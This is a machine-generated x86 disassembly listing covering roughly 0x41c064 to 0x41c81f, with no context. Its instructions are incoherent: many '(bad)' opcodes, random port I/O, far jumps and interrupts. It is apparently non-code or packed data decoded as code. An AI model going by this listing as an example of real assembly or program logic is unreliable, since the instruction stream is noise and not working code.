  41c064:	fstp   TBYTE PTR [ebp+ebp*4-0x4]
  41c068:	pushf  
  41c069:	shl    BYTE PTR [edx],cl
  41c06b:	mov    eax,ds:0x7df6f083
  41c070:	pop    ss
  41c071:	out    0x26,eax
  41c073:	pop    eax
  41c074:	call   DWORD PTR [edi+ebp*8-0x51]
  41c078:	jnp    0x41c04e
  41c07a:	mov    eax,0x8148509f
  41c07f:	xor    al,0x6a
  41c081:	and    BYTE PTR [edi+0x280138d8],ah
  41c087:	push   0x43
  41c089:	test   DWORD PTR [edi],0x31e364ae
  41c08f:	std    
  41c090:	fcomp  DWORD PTR [ecx+0x71a5f968]
  41c096:	cmc    
  41c097:	mov    eax,0x4928a4b3
  41c09c:	push   esp
  41c09d:	and    esi,ecx
  41c09f:	add    BYTE PTR [edi-0x50],cl
  41c0a2:	nop
  41c0a3:	test   BYTE PTR [edi],bh
  41c0a5:	sbb    dh,BYTE PTR [edx+0x7]
  41c0a8:	jbe    0x41c074
  41c0aa:	(bad)  
  41c0ac:	out    dx,al
  41c0ad:	jno    0x41c0a7
  41c0af:	add    DWORD PTR [ebx+0x29c2e076],edi
  41c0b5:	loop   0x41c0c7
  41c0b7:	add    DWORD PTR [ecx],eax
  41c0b9:	lods   al,BYTE PTR ds:[esi]
  41c0ba:	xor    cl,BYTE PTR ds:0x8aadbb2c
  41c0c0:	outs   dx,BYTE PTR ds:[esi]
  41c0c1:	sbb    ebp,edi
  41c0c3:	jo     0x41c120
  41c0c5:	inc    ecx
  41c0c6:	addr16 int3 
  41c0c8:	pop    ebx
  41c0c9:	and    al,0xb7
  41c0cb:	sahf   
  41c0cc:	rcl    BYTE PTR [ebp-0x550341a9],0xd7
  41c0d3:	sub    DWORD PTR ds:0xc5a7a936,ebp
  41c0d9:	lds    ecx,FWORD PTR [edi+0x5a4347d8]
  41c0df:	jmp    0xb1517e3b
  41c0e4:	adc    eax,0x560395c
  41c0e9:	or     DWORD PTR [ebx-0x55c93e0f],edx
  41c0ef:	stos   BYTE PTR es:[edi],al
  41c0f0:	test   eax,0x1ae8793a
  41c0f5:	jb     0x41c0ad
  41c0f7:	out    dx,eax
  41c0f8:	shl    DWORD PTR [eax-0x35e76a1b],0xc7
  41c0ff:	mov    ah,0x99
  41c101:	mov    eax,ds:0xc52cc60
  41c106:	or     dl,al
  41c108:	lock arpl WORD PTR [eax+0x2eeb6fd4],bx
  41c10f:	cmp    ebx,edi
  41c111:	jae    0x41c0ac
  41c113:	add    al,0x1b
  41c115:	test   ebp,edx
  41c117:	fst    st(1)
  41c119:	sbb    ch,BYTE PTR [edx+0x35]
  41c11c:	sahf   
  41c11d:	xor    DWORD PTR [esi+eiz*2-0x246fc12a],eax
  41c124:	push   0x1c
  41c126:	ss popf 
  41c128:	in     eax,dx
  41c129:	or     cl,BYTE PTR [esi+0x7360c54c]
  41c12f:	push   0xaa7f5959
  41c134:	dec    esi
  41c135:	sub    DWORD PTR [esi+0x6],edx
  41c138:	int    0xda
  41c13a:	sbb    esp,DWORD PTR [ebp-0x16]
  41c13d:	ret    0xaaaa
  41c140:	loop   0x41c102
  41c142:	mov    bl,ch
  41c144:	aam    0x89
  41c146:	test   eax,0x316a701e
  41c14b:	or     al,0x6c
  41c14d:	sub    eax,0x995a9e07
  41c152:	scas   eax,DWORD PTR es:[edi]
  41c153:	(bad)  
  41c154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c155:	sub    dh,BYTE PTR [ebx+edx*4-0x4f]
  41c159:	dec    edx
  41c15a:	sahf   
  41c15b:	pop    es
  41c15c:	nop
  41c15d:	add    al,0x66
  41c15f:	jbe    0x41c133
  41c161:	xor    edi,DWORD PTR [eax+0xa]
  41c164:	sub    al,0x90
  41c166:	loope  0x41c0f0
  41c168:	inc    esp
  41c169:	retf   0xe578
  41c16c:	pop    es
  41c16d:	stos   DWORD PTR es:[edi],eax
  41c16e:	mov    bh,ah
  41c170:	jmp    0xeae55ff1
  41c175:	lds    esp,FWORD PTR [eax-0x57]
  41c178:	xlat   BYTE PTR ds:[ebx]
  41c179:	mov    bl,0xa8
  41c17b:	mov    gs,WORD PTR [ebp-0x17]
  41c17e:	es mov ebp,edx
  41c181:	xchg   BYTE PTR [ecx-0x6d735e72],cl
  41c187:	imul   edi,DWORD PTR [eax],0x9e09762e
  41c18d:	mov    al,ds:0x57b3d499
  41c192:	or     BYTE PTR [ebx],dl
  41c194:	mov    BYTE PTR ds:0x26b50eec,bl
  41c19a:	jmp    0x41c1b4
  41c19c:	shl    esi,0x6e
  41c19f:	and    DWORD PTR [edi+0x4338d2e2],ebx
  41c1a5:	test   al,0x77
  41c1a7:	and    esi,edi
  41c1a9:	fcmovnu st,st(3)
  41c1ab:	and    dh,BYTE PTR [esi+edx*4+0x6d]
  41c1af:	ret    
  41c1b0:	inc    esi
  41c1b1:	in     eax,dx
  41c1b2:	in     eax,dx
  41c1b3:	lea    ebp,[eax-0x36ae6dfb]
  41c1b9:	dec    esp
  41c1ba:	mov    gs:0x504f30f,eax
  41c1c0:	jg     0x41c1c9
  41c1c2:	leave  
  41c1c3:	inc    ebp
  41c1c4:	or     edi,DWORD PTR fs:[ecx+edx*8]
  41c1c8:	jae    0x41c1e7
  41c1ca:	stos   DWORD PTR es:[edi],eax
  41c1cb:	mov    eax,0x1acb6e22
  41c1d0:	jne    0x41c23a
  41c1d2:	test   eax,0x5a098382
  41c1d7:	repnz test DWORD PTR [edx+eax*1+0xd],esi
  41c1dc:	mov    dl,0x11
  41c1de:	test   BYTE PTR [ebp+0x718f52f3],0x7c
  41c1e5:	and    cl,ah
  41c1e7:	psubusb mm1,mm4
  41c1ea:	imul   esp,eax,0xae66f023
  41c1f0:	inc    edi
  41c1f1:	and    al,0x40
  41c1f4:	and    edx,DWORD PTR [esi-0x377442eb]
  41c1fa:	cmp    eax,0x45862205
  41c1ff:	cdq    
  41c200:	stc    
  41c201:	aaa    
  41c202:	jl     0x41c281
  41c204:	xor    edi,DWORD PTR [edx-0x17]
  41c207:	dec    edi
  41c208:	jmp    0x37a2:0xe75c827d
  41c20f:	push   0x70152502
  41c214:	mov    BYTE PTR [eax],dl
  41c216:	jbe    0x41c224
  41c218:	mov    ecx,esp
  41c21a:	in     eax,0xe6
  41c21c:	inc    eax
  41c21d:	pop    ebx
  41c21e:	pop    ebx
  41c21f:	add    DWORD PTR [ebx],esp
  41c221:	outs   dx,DWORD PTR ds:[esi]
  41c222:	cli    
  41c223:	ins    DWORD PTR es:[edi],dx
  41c224:	imul   ebx,DWORD PTR [ebx],0x7b
  41c227:	inc    ebx
  41c228:	test   esi,0xe8254bf3
  41c22e:	adc    DWORD PTR [esi+ecx*8+0x5d3b25fe],eax
  41c235:	sbb    DWORD PTR [edx+0x2da4b0eb],0xffffffe9
  41c23c:	in     al,0x8d
  41c23e:	sub    eax,DWORD PTR [ebx+0x2f]
  41c241:	sub    eax,0x65e786f4
  41c246:	and    DWORD PTR [edi],ebx
  41c248:	mov    ecx,0x6cc3fe21
  41c24d:	test   eax,0xfa4bf78e
  41c252:	enter  0x7d65,0x40
  41c256:	shr    DWORD PTR ds:0xc52f9ec8,1
  41c25c:	mov    BYTE PTR [edi],0xd4
  41c25f:	call   0x2ac9f1fb
  41c264:	in     al,dx
  41c265:	mov    es,WORD PTR [ebx-0x289ce1e9]
  41c26b:	add    esp,DWORD PTR [eax+0x6dc032c5]
  41c271:	in     eax,0xb4
  41c273:	pop    esp
  41c274:	jmp    0x1c64:0x1619f33e
  41c27b:	fisub  DWORD PTR [ecx]
  41c27d:	fcomp  DWORD PTR [ebp+esi*1+0x55faaa58]
  41c285:	rcr    DWORD PTR es:[eax+ecx*1+0x757d60a],cl
  41c28d:	jmp    0x644f:0xc8419ae2
  41c294:	clc    
  41c295:	sub    ch,bh
  41c297:	push   edi
  41c298:	or     al,0xd1
  41c29a:	push   0x2c
  41c29c:	jb     0x41c28c
  41c29e:	fimul  DWORD PTR [esi-0x72]
  41c2a1:	sbb    bh,bh
  41c2a3:	aaa    
  41c2a4:	mov    edx,0xdf80a72d
  41c2a9:	mov    bl,0x2a
  41c2ab:	mov    ecx,0x71ac0e89
  41c2b0:	mov    al,0xfa
  41c2b2:	xchg   BYTE PTR [ecx+0xd],ah
  41c2b5:	data16 (bad) 
  41c2b7:	mov    WORD PTR [ebx+0x7],gs
  41c2ba:	inc    ebp
  41c2bb:	cli    
  41c2bc:	xchg   ecx,eax
  41c2bd:	mov    edi,0x4d73615
  41c2c2:	mov    WORD PTR ds:0x35f65186,cs
  41c2c8:	imul   edi,DWORD PTR [edi],0x73ed9618
  41c2ce:	inc    esi
  41c2d0:	imul   esp,edi,0xffffffc9
  41c2d3:	or     DWORD PTR [ecx-0x4ae1f9da],ebx
  41c2d9:	xchg   ebx,eax
  41c2da:	adc    al,ch
  41c2dc:	jmp    0x408880eb
  41c2e1:	add    al,0x25
  41c2e3:	add    eax,0xce9ab358
  41c2e8:	push   cs
  41c2e9:	and    eax,edi
  41c2eb:	arpl   sp,di
  41c2ed:	jge    0x41c32f
  41c2ef:	jnp    0x41c352
  41c2f1:	cli    
  41c2f2:	icebp  
  41c2f3:	push   esi
  41c2f4:	rcr    ebp,cl
  41c2f6:	jge    0x41c33b
  41c2f8:	mov    al,0x14
  41c2fa:	jae    0x41c373
  41c2fc:	and    edx,eax
  41c2fe:	add    al,0x2c
  41c300:	popa   
  41c301:	inc    edi
  41c302:	dec    edi
  41c303:	mov    ds:0xff06be18,al
  41c308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c309:	int    0x72
  41c30b:	mov    ecx,0x757a4ec0
  41c310:	cld    
  41c311:	xchg   ecx,eax
  41c312:	ins    DWORD PTR es:[edi],dx
  41c313:	and    eax,DWORD PTR ds:0x8cce65cf
  41c319:	addr16 dec ebp
  41c31b:	mov    esp,0x4fd25ec7
  41c320:	sbb    DWORD PTR [esi+0x730d5f4a],edi
  41c326:	dec    cl
  41c328:	mov    bl,0xa3
  41c32a:	push   0xc1b25209
  41c32f:	inc    eax
  41c330:	add    DWORD PTR [ebp+0xd],edi
  41c333:	cmp    dh,BYTE PTR [ebx+0x2eba4136]
  41c339:	hlt    
  41c33a:	adc    DWORD PTR [eax+0x60],ecx
  41c33d:	or     eax,DWORD PTR [edi+0x3f222840]
  41c343:	mov    esp,0xc6467d39
  41c348:	mov    bl,0x65
  41c34a:	js     0x41c368
  41c34c:	inc    esp
  41c34d:	pop    ds
  41c34e:	mov    ah,0x2f
  41c350:	xchg   esi,edx
  41c352:	not    BYTE PTR [eax]
  41c354:	aaa    
  41c355:	bound  ebx,QWORD PTR [esi]
  41c357:	cli    
  41c358:	outs   dx,DWORD PTR ds:[esi]
  41c359:	in     eax,dx
  41c35a:	int    0xc4
  41c35c:	das    
  41c35d:	jl     0x41c329
  41c35f:	xchg   edx,eax
  41c360:	arpl   WORD PTR [ebx+0x67],si
  41c363:	aam    0xf6
  41c365:	pop    ss
  41c366:	dec    eax
  41c367:	cmp    BYTE PTR [ebp-0x65],ch
  41c36a:	xor    dl,ah
  41c36c:	loopne 0x41c310
  41c36e:	and    al,0x93
  41c370:	(bad)  [esi-0x355df114]
  41c376:	fidivr WORD PTR [edi]
  41c378:	dec    edx
  41c379:	in     al,dx
  41c37a:	inc    ebp
  41c37b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c37c:	pop    ds
  41c37d:	(bad)  
  41c37f:	mov    dl,0xe8
  41c381:	inc    ecx
  41c382:	(bad)  [edx+0x50]
  41c385:	jecxz  0x41c3ea
  41c387:	jmp    0x41c3dd
  41c389:	inc    esp
  41c38a:	sbb    al,0x43
  41c38c:	stos   BYTE PTR es:[edi],al
  41c38d:	arpl   ax,bx
  41c38f:	enter  0x924a,0x63
  41c393:	mov    bl,BYTE PTR ss:[edi-0x42]
  41c397:	call   0x942:0x3499ec88
  41c39e:	and    BYTE PTR [ecx],dh
  41c3a0:	sub    al,0xed
  41c3a2:	sub    cl,dh
  41c3a4:	ins    DWORD PTR es:[edi],dx
  41c3a5:	or     ecx,DWORD PTR [ebx]
  41c3a7:	push   esp
  41c3a8:	add    ecx,DWORD PTR [ebp+ebx*1+0x4e]
  41c3ac:	imul   edi,DWORD PTR [ecx+eax*8-0x6735882f],0x44
  41c3b4:	add    ch,0x65
  41c3b7:	in     eax,dx
  41c3b8:	and    ebx,DWORD PTR [esp+eax*4+0x4852a300]
  41c3bf:	(bad)  
  41c3c0:	or     eax,0x27d65102
  41c3c5:	shl    DWORD PTR [edx],1
  41c3c7:	js     0x41c423
  41c3c9:	dec    ebp
  41c3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3cb:	add    bl,BYTE PTR [eax]
  41c3cd:	pop    ecx
  41c3ce:	jo     0x41c39c
  41c3d0:	jmp    0x2d397cdb
  41c3d5:	mov    dl,0x32
  41c3d7:	gs ror ah,0x2b
  41c3db:	mov    esi,0x690f6ef
  41c3e0:	iret   
  41c3e1:	iret   
  41c3e2:	scas   al,BYTE PTR es:[edi]
  41c3e3:	cmp    al,0xe1
  41c3e5:	adc    BYTE PTR ds:0xdecbb469,ah
  41c3eb:	es and al,0x39
  41c3ee:	call   0xa695:0xe3bb92f5
  41c3f5:	pop    ecx
  41c3f6:	pop    ebx
  41c3f7:	push   eax
  41c3f8:	out    dx,al
  41c3f9:	mov    ds:0xb3f02394,al
  41c3fe:	scas   eax,DWORD PTR es:[edi]
  41c3ff:	mov    esi,eax
  41c401:	mov    ebp,0x4815818d
  41c406:	retf   0x2542
  41c409:	mov    ebx,0xc8e640cf
  41c40e:	arpl   WORD PTR [ecx-0x49dfe22e],dx
  41c414:	ds jae 0x41c410
  41c417:	ins    DWORD PTR es:[edi],dx
  41c418:	jne    0x41c465
  41c41a:	jp     0x41c3e2
  41c41c:	lahf   
  41c41d:	mov    WORD PTR ds:0x4e881046,ss
  41c423:	call   0xdfa167ed
  41c428:	dec    esp
  41c429:	test   DWORD PTR [ecx+0x6d815f1f],0xb9a93c93
  41c433:	stc    
  41c434:	shl    DWORD PTR [ebp+0x46],0x1c
  41c438:	add    al,0xed
  41c43a:	pop    esi
  41c43b:	rcr    edi,1
  41c43d:	and    edx,DWORD PTR [edx+ebp*1+0x5b]
  41c441:	js     0x41c41a
  41c443:	or     edx,0xffffff92
  41c446:	out    dx,eax
  41c447:	or     eax,0x8b12a938
  41c44c:	repnz mov dl,0xb8
  41c44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c450:	je     0x41c4a2
  41c452:	outs   dx,DWORD PTR ds:[esi]
  41c453:	scas   eax,DWORD PTR es:[edi]
  41c454:	cmp    eax,0xe661b165
  41c459:	mov    DWORD PTR [ebx],ebx
  41c45b:	mov    ecx,0x949bf24f
  41c460:	dec    ebp
  41c461:	push   ecx
  41c462:	and    ah,BYTE PTR [ebp+ebx*8-0x1986ebe1]
  41c469:	sbb    al,0x51
  41c46b:	aaa    
  41c46c:	jmp    0x41c4a3
  41c46e:	xor    BYTE PTR [esi],dh
  41c470:	dec    ebp
  41c471:	sar    DWORD PTR [esi+0x2c],cl
  41c474:	shl    eax,cl
  41c476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c477:	push   ebx
  41c478:	add    bl,BYTE PTR [edx-0x506379f0]
  41c47e:	dec    ecx
  41c47f:	pop    ss
  41c480:	sbb    ch,bh
  41c482:	xor    eax,0x5401cdb8
  41c487:	call   0xe07c:0xac14f158
  41c48e:	mov    ds:0x63f6c452,al
  41c493:	cmp    ah,BYTE PTR [ebx-0x14f2866e]
  41c499:	aam    0x3a
  41c49b:	js     0x41c508
  41c49d:	push   edx
  41c49e:	jl     0x41c45f
  41c4a0:	aam    0xcd
  41c4a2:	xchg   edx,eax
  41c4a3:	sub    BYTE PTR [ecx-0x458b5218],dh
  41c4a9:	ins    BYTE PTR es:[edi],dx
  41c4aa:	xchg   esi,eax
  41c4ab:	mov    bh,0x58
  41c4ad:	adc    ch,BYTE PTR [edi-0x4e]
  41c4b0:	or     bh,BYTE PTR [ecx+eiz*1]
  41c4b3:	xchg   ebp,eax
  41c4b4:	adc    eax,0x520f0aa0
  41c4b9:	jne    0x41c4f4
  41c4bb:	or     ah,BYTE PTR [edi+eiz*2-0x36]
  41c4bf:	(bad)
  41c4c3:	ror    DWORD PTR [edi-0x46],cl
  41c4c6:	out    0x86,eax
  41c4c8:	in     al,0x8f
  41c4ca:	es inc esp
  41c4cc:	mov    al,0xcd
  41c4ce:	retf   
  41c4cf:	ret    0xe0d9
  41c4d2:	out    dx,al
  41c4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4d4:	int3   
  41c4d5:	mov    ah,ch
  41c4d7:	add    dl,ch
  41c4d9:	adc    eax,0xfdc8102
  41c4de:	mov    esi,0x2566ced2
  41c4e3:	jge    0x41c4ab
  41c4e5:	pop    esi
  41c4e6:	int    0xf6
  41c4e8:	inc    ecx
  41c4e9:	or     BYTE PTR [eax],bl
  41c4eb:	pop    edi
  41c4ec:	sub    DWORD PTR [ebx-0xb4e5df7],ebp
  41c4f2:	mov    ebx,0xe85b442d
  41c4f7:	add    eax,0x8da25ce6
  41c4fc:	xchg   edi,eax
  41c4fd:	clc    
  41c4fe:	mov    ecx,edi
  41c500:	repnz icebp 
  41c502:	push   cs
  41c503:	mov    al,ds:0x1fa60b1d
  41c508:	fdiv   st(5),st
  41c50a:	push   0xf73cb15f
  41c50f:	arpl   WORD PTR [eax-0x4d],ax
  41c512:	inc    edi
  41c513:	push   ebp
  41c514:	std    
  41c515:	pop    ss
  41c516:	mov    cl,0x51
  41c518:	jge    0x41c555
  41c51a:	jns    0x41c4a6
  41c51c:	sbb    eax,0x86220a80
  41c521:	stos   BYTE PTR es:[edi],al
  41c522:	cwde   
  41c523:	retf   0x6b22
  41c526:	inc    eax
  41c527:	ffreep st(4)
  41c529:	sahf   
  41c52a:	fwait
  41c52b:	lahf   
  41c52c:	cmp    al,0xcf
  41c52e:	ja     0x41c5a8
  41c530:	out    0x15,eax
  41c532:	push   eax
  41c533:	scas   eax,DWORD PTR es:[edi]
  41c534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c535:	les    esi,FWORD PTR [ebx]
  41c537:	pop    edi
  41c538:	inc    ebp
  41c539:	(bad)  
  41c53a:	mov    edi,0x6b81cee8
  41c53f:	and    DWORD PTR [ecx+0x1],edx
  41c542:	test   DWORD PTR fs:[ecx],esi
  41c545:	cmp    eax,0x46a77a7e
  41c54a:	retf   0x2262
  41c54d:	(bad)  
  41c54e:	and    cl,dh
  41c550:	retf   
  41c551:	loop   0x41c556
  41c553:	aaa    
  41c554:	xlat   BYTE PTR ds:[ebx]
  41c555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c556:	jmp    0xfb90:0xc04d3ca
  41c55d:	mov    edx,0x9ed2f40d
  41c562:	sar    BYTE PTR [esi+0x3b],cl
  41c565:	jne    0x41c58c
  41c567:	ss add eax,0xa0beb169
  41c56d:	loope  0x41c5ab
  41c56f:	jge    0x41c582
  41c571:	sar    DWORD PTR [ebp-0x30],0x5b
  41c575:	pop    eax
  41c576:	fist   DWORD PTR [ebp-0x42]
  41c579:	sbb    BYTE PTR [esi-0x3a],cl
  41c57c:	hlt    
  41c57d:	cmp    eax,0xdd2f9553
  41c582:	mov    eax,0x73086dc7
  41c587:	jmp    0x48732555
  41c58c:	xchg   esi,eax
  41c58d:	mov    edx,DWORD PTR [edi]
  41c58f:	test   BYTE PTR [ebx-0x58614d0c],cl
  41c595:	or     edi,ebx
  41c597:	mov    ch,0x6f
  41c599:	push   ds
  41c59a:	ss ret 
  41c59c:	jle    0x41c5d2
  41c59e:	adc    eax,0xfc585aab
  41c5a3:	(bad)  
  41c5a4:	lods   al,BYTE PTR ds:[esi]
  41c5a5:	dec    edi
  41c5a6:	ja     0x41c56b
  41c5a8:	push   ebp
  41c5a9:	retf   0x1257
  41c5ac:	int3   
  41c5ad:	retf   0x9e75
  41c5b0:	add    al,0xda
  41c5b2:	repnz in al,0x16
  41c5b5:	sub    ch,bl
  41c5b7:	mov    ds:0x57219150,eax
  41c5bc:	and    ecx,DWORD PTR [edx-0x71d555d5]
  41c5c2:	jns    0x41c581
  41c5c4:	pop    es
  41c5c5:	jo     0x41c57a
  41c5c7:	add    ebp,ebx
  41c5c9:	sbb    BYTE PTR [esp+ebp*1+0x24],ch
  41c5cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ce:	fldcw  WORD PTR [edx]
  41c5d0:	in     eax,dx
  41c5d1:	sahf   
  41c5d2:	cli    
  41c5d3:	jecxz  0x41c576
  41c5d5:	adc    ecx,DWORD PTR [eax]
  41c5d7:	rcl    BYTE PTR [esp+edx*1-0x3e266b81],cl
  41c5de:	sbb    BYTE PTR [edi-0x8e7bcb2],dh
  41c5e4:	mov    edi,0xda94784b
  41c5e9:	push   edx
  41c5ea:	sub    bh,BYTE PTR [eax+0x730fcda6]
  41c5f0:	and    BYTE PTR [eax],cl
  41c5f2:	cmp    al,0xa0
  41c5f4:	mov    edx,DWORD PTR [esi-0x3b]
  41c5f7:	mov    edx,0x5b6c0d0f
  41c5fc:	sbb    eax,0xbb690ebf
  41c601:	inc    esi
  41c602:	ins    DWORD PTR es:[edi],dx
  41c603:	inc    edi
  41c604:	xor    ah,BYTE PTR [ecx+0x34]
  41c607:	xchg   edx,eax
  41c608:	jno    0x41c680
  41c60a:	mov    WORD PTR [edx-0x7a],ss
  41c60d:	popw   es
  41c60f:	mov    ecx,edx
  41c611:	(bad)  
  41c612:	not    DWORD PTR [ecx-0x34ae6971]
  41c618:	and    ecx,DWORD PTR [eax+eiz*8]
  41c61b:	mov    edx,0x7308d71d
  41c620:	std    
  41c621:	lods   eax,DWORD PTR ds:[esi]
  41c622:	mov    edi,0xd3229b0d
  41c627:	mov    ecx,0xf6de177b
  41c62c:	xchg   edi,eax
  41c62d:	cmp    ah,ah
  41c62f:	push   edx
  41c630:	aas    
  41c631:	jmp    0xb4941fd2
  41c636:	jno    0x41c691
  41c638:	(bad)  
  41c63a:	jne    0x41c5c5
  41c63c:	call   0xfa6f:0xe61e58aa
  41c643:	xor    bh,BYTE PTR [edx]
  41c645:	ss and ebx,esi
  41c648:	mov    ecx,0x46f117b9
  41c64d:	imul   ecx,DWORD PTR [ebx-0xfdaa5cc],0xffffffbf
  41c654:	je     0x41c6b4
  41c656:	push   esp
  41c657:	xor    esp,DWORD PTR [ecx]
  41c659:	push   esi
  41c65a:	loop   0x41c67d
  41c65c:	rcr    DWORD PTR [esi+0xa],1
  41c65f:	fcmovnu st,st(2)
  41c661:	sub    dh,cl
  41c663:	inc    ebp
  41c664:	(bad)  [esp+esi*1]
  41c667:	ds addr16 mov edi,0x94687716
  41c66e:	in     al,dx
  41c66f:	repnz push cs
  41c671:	cmp    eax,0x643d9025
  41c676:	xchg   ebx,eax
  41c677:	ficomp DWORD PTR [ebp+0x6ea0848f]
  41c67d:	ja     0x41c665
  41c67f:	pop    edx
  41c680:	(bad)  
  41c684:	data16 das 
  41c686:	aas    
  41c687:	data16 jnp 0x41c692
  41c68a:	adc    bh,BYTE PTR [edi]
  41c68c:	das    
  41c68d:	push   cs
  41c68e:	xchg   BYTE PTR [edx+0x43],ch
  41c691:	outs   dx,DWORD PTR ds:[esi]
  41c692:	add    DWORD PTR ds:0xcdfca0d2,esp
  41c698:	pmaxsw mm3,QWORD PTR [edi-0x12393c4b]
  41c69f:	in     eax,dx
  41c6a0:	sar    DWORD PTR [ebx],cl
  41c6a2:	adc    dh,0x8b
  41c6a5:	call   0xaecb3ff1
  41c6aa:	call   0xf170:0x70a6e40
  41c6b1:	xchg   esp,eax
  41c6b2:	pop    ebx
  41c6b3:	out    dx,al
  41c6b4:	fisttp DWORD PTR [ebx]
  41c6b6:	sahf   
  41c6b7:	pop    edx
  41c6b8:	loop   0x41c723
  41c6ba:	push   sp
  41c6bc:	pusha  
  41c6bd:	pop    ecx
  41c6be:	pop    edx
  41c6bf:	or     dh,BYTE PTR [esi-0x27]
  41c6c2:	daa    
  41c6c3:	(bad)  
  41c6c4:	mov    dl,0xf4
  41c6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6c7:	xor    eax,0x12c3c696
  41c6cc:	cmp    BYTE PTR [edx+0x1b],cl
  41c6cf:	or     eax,0x2bba6f7e
  41c6d4:	push   es
  41c6d5:	and    DWORD PTR [ebx+0x51],ebx
  41c6d8:	frstor [eax+eiz*8-0x4cf69931]
  41c6df:	pop    ebp
  41c6e0:	aas    
  41c6e1:	test   ebx,esp
  41c6e3:	ss das 
  41c6e5:	pop    edx
  41c6e6:	hlt    
  41c6e7:	fnstcw WORD PTR [ebx+0x49]
  41c6ea:	push   esi
  41c6eb:	out    dx,al
  41c6ec:	arpl   WORD PTR [edi-0x435da7a6],bp
  41c6f2:	adc    al,BYTE PTR [ebx+0x17]
  41c6f5:	pop    ebp
  41c6f6:	dec    esp
  41c6f7:	dec    edx
  41c6f8:	aam    0xee
  41c6fa:	fild   DWORD PTR [esi+0x3]
  41c6fd:	in     al,dx
  41c6fe:	jge    0x41c737
  41c700:	mov    ch,cl
  41c702:	inc    edx
  41c703:	outs   dx,DWORD PTR ds:[esi]
  41c704:	ret    0x84fd
  41c707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c708:	cmp    DWORD PTR [eax+ebp*1+0x5c74e249],0x51
  41c710:	pop    edx
  41c711:	xchg   edx,eax
  41c712:	stc    
  41c713:	mov    al,ds:0x577bacfa
  41c718:	and    BYTE PTR [ebx-0x7209419c],bh
  41c71e:	ror    ebx,0x36
  41c721:	ins    DWORD PTR es:[edi],dx
  41c722:	imul   DWORD PTR [edi]
  41c724:	jae    0x41c6c8
  41c726:	lahf   
  41c727:	dec    eax
  41c728:	stc    
  41c729:	pop    di
  41c72b:	dec    ebx
  41c72c:	int    0x2d
  41c72e:	fwait
  41c72f:	mov    esi,0x4581a856
  41c734:	jae    0x41c784
  41c736:	(bad)  
  41c737:	test   eax,0x3e069acb
  41c73c:	scas   eax,DWORD PTR es:[edi]
  41c73d:	shr    ebp,cl
  41c73f:	js     0x41c795
  41c741:	sti    
  41c742:	or     ebx,esi
  41c744:	mov    eax,ds:0x452b07c9
  41c749:	mov    ds:0xbf1c8ff0,al
  41c74e:	retf   
  41c74f:	lods   eax,DWORD PTR ds:[esi]
  41c750:	out    0xaf,al
  41c752:	push   ecx
  41c753:	leave  
  41c754:	(bad)  
  41c756:	cdq    
  41c757:	xchg   edi,eax
  41c758:	lods   eax,DWORD PTR ds:[esi]
  41c759:	sar    BYTE PTR [esi+edi*2],0x4e
  41c75d:	xor    cl,ah
  41c75f:	ret    
  41c760:	mov    esp,0x36810179
  41c765:	push   cs
  41c766:	pushf  
  41c767:	jo     0x41c71a
  41c769:	dec    eax
  41c76a:	mov    esp,0x78700462
  41c76f:	adc    esp,DWORD PTR [edi-0x5d922c50]
  41c775:	data16 ja 0x41c7c3
  41c778:	dec    ecx
  41c779:	push   esp
  41c77a:	icebp  
  41c77b:	ror    BYTE PTR [ebp+0x7fa1fab2],1
  41c781:	sbb    ebx,DWORD PTR [edi]
  41c783:	or     dl,BYTE PTR [ebp+0x7440ffc9]
  41c789:	mov    ds:0x21e6861f,al
  41c78e:	(bad)  
  41c78f:	mov    cl,0xd2
  41c791:	mov    edx,0xa2217f0b
  41c796:	mov    edi,0x21b4e353
  41c79b:	push   ds
  41c79c:	in     eax,dx
  41c79d:	into   
  41c79e:	ss mov ah,0x57
  41c7a1:	rcl    BYTE PTR [ecx+edx*2],1
  41c7a4:	dec    ebp
  41c7a5:	jmp    0x7125:0xa8f32bf3
  41c7ac:	cwde   
  41c7ad:	enter  0xde19,0x82
  41c7b1:	dec    ecx
  41c7b2:	mov    ch,0x7a
  41c7b4:	xchg   edi,eax
  41c7b5:	push   esp
  41c7b6:	mov    DWORD PTR [eax+0x39],edx
  41c7b9:	int3   
  41c7ba:	fmul   st,st(5)
  41c7bc:	adc    BYTE PTR ds:0xe5dd862e,bh
  41c7c2:	sahf   
  41c7c3:	mov    dl,0x46
  41c7c5:	aas    
  41c7c6:	cmp    al,0x84
  41c7c8:	clc    
  41c7c9:	cmc    
  41c7ca:	int3   
  41c7cb:	enter  0x8e2f,0xed
  41c7cf:	cmp    esp,DWORD PTR [eax+0x2b6402a]
  41c7d5:	lock cmp ecx,esp
  41c7d8:	dec    edi
  41c7d9:	add    BYTE PTR [ecx-0x409ae48f],dh
  41c7df:	xchg   DWORD PTR [esi],ecx
  41c7e1:	(bad)  
  41c7e2:	in     eax,dx
  41c7e3:	pop    esi
  41c7e4:	sbb    DWORD PTR [esp+ebp*4],ebx
  41c7e7:	stos   DWORD PTR es:[edi],eax
  41c7e8:	cmp    al,0x1d
  41c7ea:	sbb    eax,0xef7bcc7e
  41c7ef:	mov    al,ds:0x841ee2aa
  41c7f4:	xor    BYTE PTR [esi-0x77],ch
  41c7f7:	cmp    ch,bh
  41c7f9:	(bad)  [esp+edx*2]
  41c7fc:	add    al,0x33
  41c7fe:	adc    al,0x91
  41c800:	adc    eax,DWORD PTR [ecx+ecx*2]
  41c803:	inc    ebx
  41c804:	fisttp WORD PTR [esi+0x1]
  41c807:	xchg   DWORD PTR [esi+eiz*4],esi
  41c80a:	test   DWORD PTR [bp+0x3b21],0xcf7decc8
  41c813:	in     eax,0x4
  41c815:	out    0x53,eax
  41c817:	and    dh,cl
  41c819:	mov    bl,0x51
  41c81b:	pushf  
  41c81c:	xor    ebx,DWORD PTR [ecx-0x10]
  41c81f:	enter  0x9b5e,0x2f
